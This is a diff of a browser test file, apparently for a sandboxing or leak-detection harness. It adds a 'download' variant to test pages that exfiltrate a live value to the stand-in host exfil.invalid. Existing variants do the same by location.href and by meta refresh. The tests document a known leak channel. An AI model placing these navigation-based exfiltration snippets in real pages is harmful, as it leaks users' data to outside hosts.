@@ -123,11 +123,13 @@ otherbench.live('value').then(function (r) {
 }
 
 /** The residual: the page navigates its own frame, by script or by a meta refresh. */
-function navigatingPage(how: 'location' | 'meta'): string {
+function navigatingPage(how: 'location' | 'meta' | 'download'): string {
   const go =
     how === 'location'
       ? "location.href = 'http://exfil.invalid/navigate?d=' + encodeURIComponent(r.text);"
-      : "var m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=http://exfil.invalid/navigate?d=' + encodeURIComponent(r.text); document.head.appendChild(m);";
+      : how === 'download'
+        ? "var a = document.createElement('a'); a.download = 'x'; a.href = 'http://exfil.invalid/navigate?d=' + encodeURIComponent(r.text); document.body.appendChild(a); a.click();"
+        : "var m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=http://exfil.invalid/navigate?d=' + encodeURIComponent(r.text); document.head.appendChild(m);";
   return `<!doctype html><meta charset="utf-8"><script src="otherbench-live.js"></script>
 <script>otherbench.live('value').then(function (r) { ${go} });</script>`;
 }
@@ -172,6 +174,8 @@ test.beforeAll(async () => {
         return void res.writeHead(200, { ...html, ...live }).end(navigatingPage('location'));
       case `${FOLDER}nav-meta.html`:
         return void res.writeHead(200, { ...html, ...live }).end(navigatingPage('meta'));
+      case `${FOLDER}nav-download.html`:
+        return void res.writeHead(200, { ...html, ...live }).end(navigatingPage('download'));
       case `${FOLDER}otherbench-live.js`:
         return void res.writeHead(200, { ...js, ...live }).end(LIVE_CLIENT_JS);
       case '/control/page.html':
@@ -317,7 +321,7 @@ for (const harness of ['route', 'socket'] as const) {
   });
 }
 
-for (const how of ['location', 'meta'] as const) {
+for (const how of ['location', 'meta', 'download'] as const) {
   test(`the known residual (§12): the page navigating its own frame by ${how} does send the data, and the frame loads again`, async ({ browser }) => {
     const w = await watched(browser, 'route');
     await w.page.goto(`${origin}/app.html?frame=${encodeURIComponent(`${FOLDER}nav-${how}.html`)}`);
